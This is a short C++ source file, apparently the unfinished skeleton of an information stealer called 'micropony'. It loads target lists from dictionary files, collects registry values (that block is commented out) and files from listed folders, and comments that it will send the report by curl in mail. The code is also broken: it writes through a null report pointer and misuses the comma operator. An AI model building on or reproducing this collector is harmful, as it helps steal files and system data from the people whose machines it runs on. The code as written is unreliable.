#include "stdafx.h"
#include "curl.h"
#include "micropony.h"

int main()
{
	Report* report = nullptr;

	List* listReg = parseList("reg.dic");
	TCHAR* value;

	/*
	for (auto &pPath : listReg->paths) {
		for (auto &pParam : listReg->params) {
			value = getKeyValue(HKEY_LOCAL_MACHINE, pPath, pParam);
			report->paths.push_back(pPath);
			report->params.push_back(pParam);
			report->values.push_back(value);
		}
	}
	*/

	List* listFile = parseList("file.dic");
	LPCWSTR nameFile, catalog;

	for (auto &pCatalog : listFile->paths) {
		for (auto &pFile : listFile->params) {
			nameFile, catalog = grabFile(pCatalog, pFile);

			report->names.push_back(nameFile);
			report->catalogs.push_back(catalog);
		}
	}

	// Send report curl in mail

	static const char* email = "";
	static const char* emailEmergency = "";


    return 0;
}

